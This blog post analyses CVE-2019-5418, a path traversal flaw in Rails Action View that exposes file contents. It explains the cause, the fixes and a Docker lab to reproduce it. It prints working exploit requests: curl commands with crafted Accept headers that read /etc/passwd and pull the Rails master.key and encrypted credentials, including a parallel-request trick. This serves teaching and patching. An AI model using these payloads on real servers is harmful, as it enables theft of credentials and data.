---
layout: post
title:  "CVE-2019-5418"
summary: "File Content Disclosure in Action View"
date: 2020-08-09 00:13:37
image: /assets/profile.png
author: tim_koopmans
categories: ruby
tags:
 - security
---
[First published](https://nvd.nist.gov/vuln/detail/CVE-2019-5418) on 27 March 2019

# File Content Disclosure in Action View

## tl;dr
If you render files without templates in your controllers on affected versions of Rails, it is possible for attackers to read arbitrary files on your file system. From there, bad things happen.
{: .critical }

<table>
  <thead>
    <tr>
      <th>Related Code</th>
      <th>Affected Versions</th>
      <th>Patched Versions</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <i class="devicon-ruby-plain"></i>
        <a href="https://api.rubyonrails.org/classes/ActionView.html">ActionView</a>
      </td>
      <td>
        All
      </td>
      <td>
        6.0.0.beta3<br/>
        5.2.2.1<br/>
        5.1.6.2<br/>
        5.0.7.2<br/>
        4.2.11.1
      </td>
    </tr>
  </tbody>
</table>

[![asciicast](https://asciinema.org/a/cjBL2f36vLFqL5o4115iCJ6In.svg)](https://asciinema.org/a/cjBL2f36vLFqL5o4115iCJ6In)
<script id="asciicast-cjBL2f36vLFqL5o4115iCJ6In" src="https://asciinema.org/a/cjBL2f36vLFqL5o4115iCJ6In.js" async></script>

## Weakness

This vulnerability lets an attacker [traverse directory paths ](http://cwe.mitre.org/data/definitions/22.html) which can then lead to the [exposure of sensitive information](http://cwe.mitre.org/data/definitions/200.html).

## Vulnerability

Specially crafted `Accept` request headers in combination with a call to endpoints that `render file:` can be used to traverse directory paths and expose sensitive information.

A vulnerable controller will look something like this:

```ruby
class UserController < ApplicationController
  def index
    render file: "#{Rails.root}/some/file"
  end
end
```

The attacking request will look something like this:

{% highlight bash %}
{% raw %}
curl -H 'Accept: ../../../../../../../../etc/passwd{{' http://target/users
{% endraw %}
{% endhighlight %}

Since the target endpoint controller renders files without a specified accept format, then the contents of the file `/etc/passwd` can be read.

## Breakdown

The `ActionView::TemplateRenderer` class will try to resolve a path, that is based on the formats requested in the `Accept` header.[^fn-render]

The attack exploits code in the `ActionView::PathResolver` class, in particular, the way in which template paths are queried in the [find_template_paths](https://github.com/rails/rails/blob/v5.2.1/actionview/lib/action_view/template/resolver.rb#L246-L252) method.

```ruby
def find_template_paths(query)
  Dir[query].uniq.reject do |filename|
    File.directory?(filename) ||
      # deals with case-insensitive file systems.
      !File.fnmatch(query, filename, File::FNM_EXTGLOB)
  end
end
```

Objects of class `Dir` are directory streams, representing directories in the underlying file system. `Dir[query]` is equivalent to calling `Dir.glob([string,...], 0)` which will return an array of matching directories.

The pattern passed to the `glob` method looks like a regexp but is more like a shell glob. The attacker takes advantage of this by passing in a pattern that looks like this:

{% highlight shell %}
{% raw %}
../../../../../../../../etc/passwd{{
{% endraw %}
{% endhighlight %}

So instead of a glob for this:

{% highlight shell %}
{% raw %}
/app/app/views/layouts/users{.en,}
  {.html,}
  {}
  {.raw,.erb,.html,.builder,.ruby,.coffee,.jbuilder,}
{% endraw %}
{% endhighlight %}

The addition of the `Accept` header will glob for this:

{% highlight shell %}
{% raw %}
/app/app/views/layouts/users{.en,}
  {.../../../../../../etc/password{{,}
  {}
  {.raw,.erb,.html,.builder,.ruby,.coffee,.jbuilder,}
{% endraw %}
{% endhighlight %}

The double `{` is enough to make this a valid pattern. The `../` pattern goes up one directory from wherever the code is called, and repeating them enough times, gets you back to root, high enough to then read in something like `/etc/passwd`. The contents of that file are then cached and rendered back to the user.

The attacker can do more damage though, by reading sensitive files, such as those used by the Rails credentials API. These files typically live in the `#{Rails.root}/config/` directory, and the attacker can use a pattern that looks like this to read them:

{% highlight shell %}
{% raw %}
../../../../../../**/config/master.key{{
{% endraw %}
{% endhighlight %}

The inclusion of a `**` pattern will match directories recursively (without needing to guess the directory layout), and the `config/master.key` pattern should find the `master.key` in the target Rails config directory. If the attacker retrieves that key along with `credentials.yml.enc` from the same directory, they will be able to decrypt and use related credentials in chained attacks.

Of note though, the contents are cached[^fn-cached] so an attacker will need to make multiple requests to different servers or wait for your server to be redeployed with a cold cache. It's also possible to fork a race condition with something like this to retrieve both files:

{% highlight shell %}
{% raw %}
curl -H 'Accept: ../../../../../../**/config/master.key{{' \
  http://localhost:3000/users/index & \
curl -H 'Accept: ../../../../../../**/config/credentials.yml.enc{{' \
  http://localhost:3000/users/index
{% endraw %}
{% endhighlight %}

## Fix

<mark>The best fix for this, is to upgrade Rails to one of the patched versions.</mark>

The vulnerability can be mitigated by making sure you render files with a fixed format:

```ruby
render file: "#{Rails.root}/some/file", formats: [:html]
```
You can also monkey patch `ActionDispatch` via your own initializer, which is similar to what the [patched versions](https://github.com/rails/rails/blob/fbe2433be6e052a1acac63c7faf287c52ed3c5ba/actionpack/lib/action_dispatch/http/mime_negotiation.rb#L83-L85) of the `MimeNegotiation` module do to prevent a string containing traverse patterns being accepted in the first place:

```ruby
ActionDispatch::Request.prepend(Module.new do
  def formats
    super().select do |format|
      format.symbol || format.ref == "*/*"
    end
  end
end)
```

In general, it's best to upgrade to a patched version of Rails before monkey patching this yourself. The latter is easily forgotten over time and can cause you all sorts of headaches in future.

# Research

You can re-create this with a [canned CVE environment](https://github.com/correkthorse/rails-cve-testing) using Docker. To build the vulnerable image:

    CVE=CVE-2019-5418 RAILS_VERSION=5.2.1 make build

Then to run it locally, for testing:

    CVE=CVE-2019-5418 make server

Then target it:

{% highlight shell %}
{% raw %}
curl -H 'Accept: ../../../../../../**/config/master.key{{' http://localhost:3000/users/index
flag{master}
{% endraw %}
{% endhighlight %}

# References

[^fn-render]: [Analysis for CVE-2019-5418 File Content Disclosure on Rails ](https://chybeta.github.io/2019/03/16/Analysis-for%E3%80%90CVE-2019-5418%E3%80%91File-Content-Disclosure-on-Rails/)
[^fn-cached]: [CVE-2019â€“5418: on WAF bypass and caching](https://blog.pentesterlab.com/cve-2019-5418-on-waf-bypass-and-caching-10e93f9a1981)
